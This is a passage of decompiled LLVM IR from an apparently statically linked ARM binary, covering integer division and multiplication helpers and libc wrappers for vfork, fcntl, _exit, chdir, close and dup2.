  %v0_f46015.in = phi i32 [ %v2_f454, %bb81 ], [ %v7_f45c, %bb82 ]
  %v1_f46014.in = phi i32 [ %v5_f454, %bb81 ], [ %v10_f45c, %bb82 ]
  %v1_f46014 = icmp slt i32 %v1_f46014.in, 0
  %v0_f46015 = icmp slt i32 %v0_f46015.in, 0
  %v2_f460 = xor i1 %v0_f46015, %v1_f46014
  br i1 %v2_f460, label %dec_label_pc_f464, label %dec_label_pc_f434

dec_label_pc_f464:                                ; preds = %bb83
  %v1_f464 = urem i32 %v0_f464, 4
  %v2_f464 = icmp eq i32 %v1_f464, 0
  br i1 %v2_f464, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_f464
  %v3_f468 = icmp eq i32 %v1_f440.v6_f440.v6_f448.v6_f450, 0
  br i1 %v3_f468, label %bb76, label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %bb84, %dec_label_pc_f42c
  %v0_f484 = phi i32 [ %v3_f458, %bb84 ], [ %v1_f420, %dec_label_pc_f42c ]
  %v1_f480 = phi i32 [ %v1_f440.v6_f440.v6_f448.v6_f450, %bb84 ], [ %v1_f3ec, %dec_label_pc_f42c ]
  %v0_f470 = phi i32 [ %v0_f464, %bb84 ], [ %v2_f42c, %dec_label_pc_f42c ]
  %v5_f474 = icmp slt i32 %v0_f470, -2
  br i1 %v5_f474, label %dec_label_pc_f494, label %dec_label_pc_f478

dec_label_pc_f478:                                ; preds = %dec_label_pc_f470
  %v8_f470 = icmp eq i32 %v0_f470, -2
  br i1 %v8_f470, label %dec_label_pc_f488, label %dec_label_pc_f47c

dec_label_pc_f47c:                                ; preds = %dec_label_pc_f478
  %v3_f47c = icmp ult i32 %v1_f480, %v0_f484
  br i1 %v3_f47c, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_f47c
  %v2_f47c = sub i32 %v1_f480, %v0_f484
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_f47c, %bb85
  %v0_f48852 = phi i32 [ %v1_f480, %dec_label_pc_f47c ], [ %v2_f47c, %bb85 ]
  %v3_f484 = udiv i32 %v0_f484, 2
  br label %dec_label_pc_f488

dec_label_pc_f488:                                ; preds = %dec_label_pc_f478, %bb86
  %v0_f490 = phi i32 [ %v0_f484, %dec_label_pc_f478 ], [ %v3_f484, %bb86 ]
  %v1_f48c = phi i32 [ %v1_f480, %dec_label_pc_f478 ], [ %v0_f48852, %bb86 ]
  %v3_f488 = icmp ult i32 %v1_f48c, %v0_f490
  br i1 %v3_f488, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_f488
  %v2_f488 = sub i32 %v1_f48c, %v0_f490
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_f488, %bb87
  %v0_f49455 = phi i32 [ %v1_f48c, %dec_label_pc_f488 ], [ %v2_f488, %bb87 ]
  %v3_f490 = udiv i32 %v0_f490, 2
  br label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f470, %bb88
  %v2_f498 = phi i32 [ %v0_f484, %dec_label_pc_f470 ], [ %v3_f490, %bb88 ]
  %v1_f498 = phi i32 [ %v1_f480, %dec_label_pc_f470 ], [ %v0_f49455, %bb88 ]
  %v3_f494 = icmp ult i32 %v1_f498, %v2_f498
  br i1 %v3_f494, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_f494
  %v2_f494 = sub i32 %v1_f498, %v2_f498
  br label %bb76

dec_label_pc_f4a0:                                ; preds = %entry
  %v0_f4a0 = load i32, i32* @lr, align 4
  %v0_f4a4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f4a0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_f498, { 1, 2, 0 }
  uselistorder i32 %v0_f484, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f464, { 1, 0, 2 }
  uselistorder i32 %v7_f45c, { 1, 0 }
  uselistorder i32 %v3_f458, { 1, 0 }
  uselistorder i32 %v1_f440.v6_f440.v6_f448.v6_f450, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_f44c, { 1, 0 }
  uselistorder i32 %v4_f444, { 1, 0 }
  uselistorder i32 %v4_f43c, { 1, 0 }
  uselistorder i32 %v6_f45c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f42c, { 1, 0 }
  uselistorder i32 %v1_f420, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_f40c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f418.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f3ec, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_f494, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_f488, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_f434, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_f4b0 = icmp eq i32 %arg2, 0
  br i1 %v2_f4b0, label %dec_label_pc_f584, label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %entry
  %v1_f4b0 = icmp slt i32 %arg2, 0
  br i1 %v1_f4b0, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_f4b8
  %v2_f4b8 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_f4b8, %bb
  %v4_f4d0 = phi i32 [ %arg2, %dec_label_pc_f4b8 ], [ %v2_f4b8, %bb ]
  %v0_f4bc = load i32, i32* @r0, align 4
  %v1_f4bc = icmp slt i32 %v0_f4bc, 0
  br i1 %v1_f4bc, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_f4c0 = sub i32 0, %v0_f4bc
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_f4c8 = phi i32 [ %v0_f4bc, %bb79 ], [ %v2_f4c0, %bb80 ]
  %v1_f4c4 = add i32 %v4_f4d0, -1
  %v7_f4c4 = icmp eq i32 %v4_f4d0, 1
  br i1 %v7_f4c4, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_f4c8 = icmp eq i32 %v1_f4c8, %v4_f4d0
  br i1 %v10_f4c8, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_f4c8 = icmp ult i32 %v1_f4c8, %v4_f4d0
  br i1 %v4_f4c8, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_f4d0 = and i32 %v1_f4c4, %v4_f4d0
  %v8_f4d0 = icmp eq i32 %v6_f4d0, 0
  br i1 %v8_f4d0, label %.thread72, label %dec_label_pc_f4e0.preheader

dec_label_pc_f4e0.preheader:                      ; preds = %bb84
  %v2_f4e0109 = icmp ugt i32 %v4_f4d0, 268435455
  br i1 %v2_f4e0109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_f4d464 = phi i32 [ %v1_f4c8, %bb84 ], [ 0, %.thread70 ]
  %v3_f4d4 = and i32 %v1_f4d464, %v1_f4c4
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_f4e0.preheader
  %v0_f4f4.pr35.lcssa = phi i32 [ %v4_f4d0, %dec_label_pc_f4e0.preheader ], [ %v4_f4e8, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f4e0.preheader ], [ %v2_f4ec9, %.thread2.thread7 ]
  br label %dec_label_pc_f4f4thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_f4e0.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_f4ec9, %.thread2.thread7 ], [ 0, %dec_label_pc_f4e0.preheader ]
  %v0_f4f4.pr35110 = phi i32 [ %v4_f4e8, %.thread2.thread7 ], [ %v4_f4d0, %dec_label_pc_f4e0.preheader ]
  %v4_f4e4 = icmp ult i32 %v0_f4f4.pr35110, %v1_f4c8
  br i1 %v4_f4e4, label %bb86, label %dec_label_pc_f4f4thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_f4e8 = and i32 %v0_f4f4.pr35110, 268435456
  %v3_f4e8 = icmp eq i32 %v2_f4e8, 0
  %v4_f4e8 = mul i32 %v0_f4f4.pr35110, 16
  br i1 %v3_f4e8, label %.thread2.thread7, label %dec_label_pc_f4f4.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_f4ec9 = add i32 %storemerge111, 4
  %v2_f4e0 = icmp ugt i32 %v4_f4e8, 268435455
  br i1 %v2_f4e0, label %.thread1, label %bb85

dec_label_pc_f4f4thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_f4f4thread-pre-split.loopexit

dec_label_pc_f4f4thread-pre-split.loopexit:       ; preds = %dec_label_pc_f4f4thread-pre-split.loopexit.loopexit, %.thread1
  %v0_f4f4.pr35108 = phi i32 [ %v0_f4f4.pr35.lcssa, %.thread1 ], [ %v0_f4f4.pr35110, %dec_label_pc_f4f4thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_f4f4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f4f4thread-pre-split

dec_label_pc_f4f4thread-pre-split:                ; preds = %.thread4, %dec_label_pc_f4f4thread-pre-split.loopexit
  %v1_f50041 = phi i32 [ %storemerge105, %dec_label_pc_f4f4thread-pre-split.loopexit ], [ %v2_f500, %.thread4 ]
  %v2_f4f836 = phi i32 [ %v1_f4c8, %dec_label_pc_f4f4thread-pre-split.loopexit ], [ %v2_f4f8, %.thread4 ]
  %v0_f4f4.pr = phi i32 [ %v0_f4f4.pr35108, %dec_label_pc_f4f4thread-pre-split.loopexit ], [ %v3_f4fc, %.thread4 ]
  br label %dec_label_pc_f4f4

dec_label_pc_f4f4.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4f4.loopexit, %dec_label_pc_f4f4thread-pre-split
  %v0_f508.pr = phi i32 [ %v1_f50041, %dec_label_pc_f4f4thread-pre-split ], [ %storemerge111, %dec_label_pc_f4f4.loopexit ]
  %v2_f4f8 = phi i32 [ %v2_f4f836, %dec_label_pc_f4f4thread-pre-split ], [ %v1_f4c8, %dec_label_pc_f4f4.loopexit ]
  %v1_f4fc = phi i32 [ %v0_f4f4.pr, %dec_label_pc_f4f4thread-pre-split ], [ %v4_f4e8, %dec_label_pc_f4f4.loopexit ]
  %v2_f4f4 = icmp slt i32 %v1_f4fc, 0
  br i1 %v2_f4f4, label %dec_label_pc_f508, label %bb87

bb87:                                             ; preds = %dec_label_pc_f4f4
  %v4_f4f8 = icmp ult i32 %v1_f4fc, %v2_f4f8
  br i1 %v4_f4f8, label %.thread4, label %dec_label_pc_f508

.thread4:                                         ; preds = %bb87
  %v3_f4fc = mul i32 %v1_f4fc, 2
  %v2_f500 = add i32 %v0_f508.pr, 1
  br label %dec_label_pc_f4f4thread-pre-split

dec_label_pc_f508:                                ; preds = %bb87, %dec_label_pc_f4f4
  %v2_f508 = add i32 %v0_f508.pr, -3
  %v5_f50c = icmp slt i32 %v0_f508.pr, 3
  br i1 %v5_f50c, label %dec_label_pc_f54c, label %dec_label_pc_f510

dec_label_pc_f510:                                ; preds = %dec_label_pc_f508, %bb91
  %v6_f538 = phi i32 [ %v0_f540, %bb91 ], [ %v2_f508, %dec_label_pc_f508 ]
  %v1_f514 = phi i32 [ %v1_f51c.v6_f51c.v6_f524.v6_f52c, %bb91 ], [ %v2_f4f8, %dec_label_pc_f508 ]
  %v3_f53410 = phi i32 [ %v3_f534, %bb91 ], [ %v1_f4fc, %dec_label_pc_f508 ]
  %v3_f510 = icmp ult i32 %v1_f514, %v3_f53410
  %v3_f514 = select i1 %v3_f510, i32 0, i32 %v3_f53410
  %v1_f51c = sub i32 %v1_f514, %v3_f514
  %v4_f518 = udiv i32 %v3_f53410, 2
  %v6_f518 = icmp ult i32 %v1_f51c, %v4_f518
  %v6_f51c = select i1 %v6_f518, i32 0, i32 %v4_f518
  %v1_f51c.v6_f51c = sub i32 %v1_f51c, %v6_f51c
  %.demorgan = and i1 %v3_f510, %v6_f518
  %v4_f520 = udiv i32 %v3_f53410, 4
  %v6_f520 = icmp ult i32 %v1_f51c.v6_f51c, %v4_f520
  %v6_f524 = select i1 %v6_f520, i32 0, i32 %v4_f520
  %v1_f51c.v6_f51c.v6_f524 = sub i32 %v1_f51c.v6_f51c, %v6_f524
  %.demorgan76 = and i1 %.demorgan, %v6_f520
  %v4_f528 = udiv i32 %v3_f53410, 8
  %v6_f528 = icmp ult i32 %v1_f51c.v6_f51c.v6_f524, %v4_f528
  %v6_f52c = select i1 %v6_f528, i32 0, i32 %v4_f528
  %v1_f51c.v6_f51c.v6_f524.v6_f52c = sub i32 %v1_f51c.v6_f51c.v6_f524, %v6_f52c
  %.demorgan77 = and i1 %.demorgan76, %v6_f528
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_f510
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_f510, %bb88
  %v2_f530 = add i32 %v1_f51c.v6_f51c.v6_f524.v6_f52c, -1
  %v4_f530 = sub i32 0, %v1_f51c.v6_f51c.v6_f524.v6_f52c
  %v5_f530 = and i32 %v1_f51c.v6_f51c.v6_f524.v6_f52c, %v4_f530
  %v3_f534 = udiv i32 %v3_f53410, 16
  %v5_f538 = icmp slt i32 %v1_f51c.v6_f51c.v6_f524.v6_f52c, 1
  br i1 %v5_f538, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_f538 = add i32 %v6_f538, -4
  %v9_f538 = sub i32 3, %v6_f538
  %v10_f538 = and i32 %v9_f538, %v6_f538
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_f540 = phi i32 [ %v6_f538, %bb89 ], [ %v7_f538, %bb90 ]
  %v0_f53c13.in = phi i32 [ %v2_f530, %bb89 ], [ %v7_f538, %bb90 ]
  %v1_f53c12.in = phi i32 [ %v5_f530, %bb89 ], [ %v10_f538, %bb90 ]
  %v1_f53c12 = icmp slt i32 %v1_f53c12.in, 0
  %v0_f53c13 = icmp slt i32 %v0_f53c13.in, 0
  %v2_f53c = xor i1 %v0_f53c13, %v1_f53c12
  br i1 %v2_f53c, label %dec_label_pc_f540, label %dec_label_pc_f510

dec_label_pc_f540:                                ; preds = %bb91
  %v1_f540 = urem i32 %v0_f540, 4
  %v2_f540 = icmp eq i32 %v1_f540, 0
  br i1 %v2_f540, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_f540
  %v3_f544 = icmp eq i32 %v1_f51c.v6_f51c.v6_f524.v6_f52c, 0
  br i1 %v3_f544, label %.thread6, label %dec_label_pc_f54c

dec_label_pc_f54c:                                ; preds = %bb92, %dec_label_pc_f508
  %v0_f560 = phi i32 [ %v3_f534, %bb92 ], [ %v1_f4fc, %dec_label_pc_f508 ]
  %v1_f55c = phi i32 [ %v1_f51c.v6_f51c.v6_f524.v6_f52c, %bb92 ], [ %v2_f4f8, %dec_label_pc_f508 ]
  %v0_f54c = phi i32 [ %v0_f540, %bb92 ], [ %v2_f508, %dec_label_pc_f508 ]
  %v5_f550 = icmp slt i32 %v0_f54c, -2
  br i1 %v5_f550, label %dec_label_pc_f570, label %dec_label_pc_f554

dec_label_pc_f554:                                ; preds = %dec_label_pc_f54c
  %v8_f54c = icmp eq i32 %v0_f54c, -2
  br i1 %v8_f54c, label %dec_label_pc_f564, label %dec_label_pc_f558

dec_label_pc_f558:                                ; preds = %dec_label_pc_f554
  %v3_f558 = icmp ult i32 %v1_f55c, %v0_f560
  br i1 %v3_f558, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_f558
  %v2_f558 = sub i32 %v1_f55c, %v0_f560
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_f558, %bb93
  %v0_f56454 = phi i32 [ %v1_f55c, %dec_label_pc_f558 ], [ %v2_f558, %bb93 ]
  %v3_f560 = udiv i32 %v0_f560, 2
  br label %dec_label_pc_f564

dec_label_pc_f564:                                ; preds = %dec_label_pc_f554, %bb94
  %v0_f56c = phi i32 [ %v0_f560, %dec_label_pc_f554 ], [ %v3_f560, %bb94 ]
  %v1_f568 = phi i32 [ %v1_f55c, %dec_label_pc_f554 ], [ %v0_f56454, %bb94 ]
  %v3_f564 = icmp ult i32 %v1_f568, %v0_f56c
  br i1 %v3_f564, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_f564
  %v2_f564 = sub i32 %v1_f568, %v0_f56c
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_f564, %bb95
  %v0_f57057 = phi i32 [ %v1_f568, %dec_label_pc_f564 ], [ %v2_f564, %bb95 ]
  %v3_f56c = udiv i32 %v0_f56c, 2
  br label %dec_label_pc_f570

dec_label_pc_f570:                                ; preds = %dec_label_pc_f54c, %bb96
  %v2_f574 = phi i32 [ %v0_f560, %dec_label_pc_f54c ], [ %v3_f56c, %bb96 ]
  %v1_f574 = phi i32 [ %v1_f55c, %dec_label_pc_f54c ], [ %v0_f57057, %bb96 ]
  %v3_f570 = icmp ult i32 %v1_f574, %v2_f574
  br i1 %v3_f570, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_f570
  %v2_f570 = sub i32 %v1_f574, %v2_f574
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_f570, %bb83, %.thread72, %dec_label_pc_f540, %bb92, %bb97
  %v1_f57c = phi i32 [ %v1_f51c.v6_f51c.v6_f524.v6_f52c, %dec_label_pc_f540 ], [ 0, %bb92 ], [ %v1_f574, %dec_label_pc_f570 ], [ %v2_f570, %bb97 ], [ %v3_f4d4, %.thread72 ], [ %v1_f4c8, %bb83 ]
  br i1 %v1_f4bc, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_f57c = sub i32 0, %v1_f57c
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_f580 = phi i32 [ %v1_f57c, %.thread6 ], [ %v2_f57c, %bb98 ]
  ret i32 %v1_f580

dec_label_pc_f584:                                ; preds = %entry
  %v0_f584 = load i32, i32* @lr, align 4
  %v0_f588 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f584)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_f560, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f540, { 1, 0, 2 }
  uselistorder i32 %v7_f538, { 1, 0 }
  uselistorder i32 %v3_f534, { 1, 0 }
  uselistorder i32 %v1_f51c.v6_f51c.v6_f524.v6_f52c, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_f528, { 1, 0 }
  uselistorder i32 %v4_f520, { 1, 0 }
  uselistorder i32 %v4_f518, { 1, 0 }
  uselistorder i32 %v6_f538, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f508, { 1, 0 }
  uselistorder i32 %v1_f4fc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_f4f8, { 1, 0, 3, 2 }
  uselistorder i32 %v4_f4e8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f4f4.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f4c8, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_f4d0, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_f570, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f564, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_f510, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_f594 = load i32, i32* @r0, align 4
  ret i32 %v1_f594
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_f5a4 = udiv i32 %arg1, 65536
  %v3_f5a8 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_f5a4, -65536
  %v5_f5ac = add i32 %tmp, -1
  %v6_f5ac = and i32 %v5_f5ac, %arg1
  %tmp10 = mul i32 %v3_f5a8, -65536
  %v5_f5b0 = add i32 %tmp10, -1
  %v6_f5b0 = and i32 %v5_f5b0, %arg3
  %v2_f5b4 = mul i32 %v6_f5b0, %v6_f5ac
  %v2_f5b8 = mul i32 %v6_f5b0, %v3_f5a4
  %v2_f5bc = mul i32 %v6_f5ac, %v3_f5a8
  %v2_f5c4 = add i32 %v2_f5b8, %v2_f5bc
  %v3_f5c4 = icmp ult i32 %v2_f5c4, %v2_f5b8
  br i1 %v3_f5c4, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_f5cc = mul i32 %v2_f5c4, 65536
  %v5_f5cc = add i32 %v4_f5cc, %v2_f5b4
  ret i32 %v5_f5cc

; uselistorder directives
  uselistorder i32 %v2_f5b8, { 1, 0 }
  uselistorder i32 %v6_f5ac, { 1, 0 }
  uselistorder i32 %v3_f5a8, { 1, 0 }
  uselistorder i32 %v3_f5a4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_f5e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5e8:
  ret i32 %arg1
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f5f0 = call i32 @vfork()
  store i32 %v0_f5f0, i32* @r0, align 4
  %v2_f5f4 = icmp ugt i32 %v0_f5f0, -4097
  br i1 %v2_f5f4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_f608, %entry
  %merge = phi i32 [ %v0_f5f0, %entry ], [ %v0_f608, %dec_label_pc_f608 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_f600 = icmp eq i32 %v0_f5f0, -38
  br i1 %v4_f600, label %dec_label_pc_f608, label %bb2

dec_label_pc_f608:                                ; preds = %bb1
  %v0_f608 = call i32 @fork()
  store i32 %v0_f608, i32* @r0, align 4
  %v2_f60c = icmp ugt i32 %v0_f608, -4097
  br i1 %v2_f60c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_f608
  %v0_f614 = call i32 @__syscall_error()
  ret i32 %v0_f614

; uselistorder directives
  uselistorder i32 %v0_f608, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_f620 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_f630 = add i32 %arg2, -12
  store i32 %v6_f620, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_f630, 2
  br i1 %tmp, label %dec_label_pc_f658, label %dec_label_pc_f650

dec_label_pc_f650:                                ; preds = %entry
  %v0_f650 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_f684

dec_label_pc_f658:                                ; preds = %entry
  %v2_f660 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_f660, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_f660, -4095
  br i1 %tmp8, label %dec_label_pc_f684, label %dec_label_pc_f670

dec_label_pc_f670:                                ; preds = %dec_label_pc_f658
  %v0_f670 = call i32 @__errno_location()
  %v0_f674 = load i32, i32* %r4.global-to-local, align 4
  %v1_f674 = sub i32 0, %v0_f674
  %v2_f678 = inttoptr i32 %v0_f670 to i32*
  store i32 %v1_f674, i32* %v2_f678, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f670, %dec_label_pc_f658, %dec_label_pc_f650
  %storemerge = phi i32 [ %v0_f650, %dec_label_pc_f650 ], [ %v2_f660, %dec_label_pc_f658 ], [ -1, %dec_label_pc_f670 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_f660, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f6b4 = load i32, i32* @r0, align 4
  store i32 %v0_f6b4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f6b4, -4095
  br i1 %tmp, label %dec_label_pc_f6d0, label %dec_label_pc_f6c0

dec_label_pc_f6c0:                                ; preds = %entry
  %v0_f6c0 = call i32 @__errno_location()
  %v0_f6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6c4 = sub i32 0, %v0_f6c4
  %v2_f6c8 = inttoptr i32 %v0_f6c0 to i32*
  store i32 %v1_f6c4, i32* %v2_f6c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f6d0

dec_label_pc_f6d0:                                ; preds = %entry, %dec_label_pc_f6c0
  %v0_f6d0 = phi i32 [ %v0_f6b4, %entry ], [ -1, %dec_label_pc_f6c0 ]
  ret i32 %v0_f6d0

; uselistorder directives
  uselistorder i32 %v0_f6b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f6d0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f70c = load i32, i32* @r4, align 4
  store i32 %v3_f70c, i32* %stack_var_-8, align 4
  %v0_f710 = call i32 @chdir()
  store i32 %v0_f710, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f710, -4095
  br i1 %tmp, label %dec_label_pc_f730, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %entry
  %v0_f720 = call i32 @__errno_location()
  %v0_f724 = load i32, i32* %r4.global-to-local, align 4
  %v1_f724 = sub i32 0, %v0_f724
  %v2_f728 = inttoptr i32 %v0_f720 to i32*
  store i32 %v1_f724, i32* %v2_f728, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f730

dec_label_pc_f730:                                ; preds = %entry, %dec_label_pc_f720
  %v0_f730 = phi i32 [ %v0_f710, %entry ], [ -1, %dec_label_pc_f720 ]
  %v2_f734 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f734, i32* @r4, align 4
  ret i32 %v0_f730

; uselistorder directives
  uselistorder i32 %v0_f710, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_f730, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f738 = load i32, i32* @r4, align 4
  store i32 %v3_f738, i32* %stack_var_-8, align 4
  %v1_f73c = call i32 @close(i32 %arg1)
  store i32 %v1_f73c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_f73c, -4095
  br i1 %tmp, label %dec_label_pc_f75c, label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %entry
  %v0_f74c = call i32 @__errno_location()
  %v0_f750 = load i32, i32* %r4.global-to-local, align 4
  %v1_f750 = sub i32 0, %v0_f750
  %v2_f754 = inttoptr i32 %v0_f74c to i32*
  store i32 %v1_f750, i32* %v2_f754, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f75c

dec_label_pc_f75c:                                ; preds = %entry, %dec_label_pc_f74c
  %v0_f75c = phi i32 [ %v1_f73c, %entry ], [ -1, %dec_label_pc_f74c ]
  %v2_f760 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f760, i32* @r4, align 4
  ret i32 %v0_f75c

; uselistorder directives
  uselistorder i32 %v1_f73c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f75c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f764 = load i32, i32* @r4, align 4
  store i32 %v3_f764, i32* %stack_var_-8, align 4
  %v0_f768 = call i32 @dup2()
  store i32 %v0_f768, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f768, -4095
  br i1 %tmp, label %dec_label_pc_f788, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %entry
  %v0_f778 = call i32 @__errno_location()
  %v0_f77c = load i32, i32* %r4.global-to-local, align 4
  %v1_f77c = sub i32 0, %v0_f77c
  %v2_f780 = inttoptr i32 %v0_f778 to i32*
